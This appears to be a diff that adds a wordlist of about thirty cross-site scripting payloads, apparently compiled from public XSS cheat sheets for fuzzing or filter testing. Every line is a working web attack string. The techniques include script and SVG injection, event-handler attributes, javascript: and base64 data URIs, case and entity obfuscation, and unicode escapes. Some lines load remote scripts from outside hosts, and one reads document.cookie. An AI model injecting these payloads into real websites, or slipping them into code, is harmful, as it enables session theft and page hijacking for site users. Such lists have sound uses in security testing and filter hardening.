@@ -1,0 +1,30 @@
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
+<form onsubmit=alert(1)><input type=submit>
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<script>alert(document.head.childNodes[3].text)</script>
+"><svg onload=alert(1)//
+<html ontouchmove=alert(1)>
+<svg/onload=alert(1)
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<%<!--'%><script>alert(1);</script -->
+'-alert(1)//
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+"onmouseover=alert(1)//
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<x on%78xx=1
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+</script><svg onload=alert(1)>
+<br><br><br><br><br><br><br><br><br><br>
+<x onmouseout=alert(1)>hover this!
+<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<BGSOUND SRC="javascript:alert('XSS');">
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<x%0Aonxxx=1
+<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
+"autofocus/onfocus=alert(1)//
